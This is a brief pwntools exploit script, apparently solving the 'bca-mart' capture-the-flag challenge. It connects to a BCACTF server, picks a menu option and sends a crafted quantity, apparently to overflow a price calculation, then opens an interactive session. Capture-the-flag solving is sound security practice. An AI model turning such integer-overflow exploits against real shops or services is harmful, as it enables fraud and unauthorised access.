from pwn import *

exe = ELF("./bca-mart_patched")
context.binary = exe

def conn():
        return remote("bin.bcactf.com", 49153)

def main():
    r = conn()
    r.sendlineafter("> ", "6")
    r.sendlineafter("> ", str(int(0xffffffff/15)))
    r.interactive()


if __name__ == "__main__":
    main()
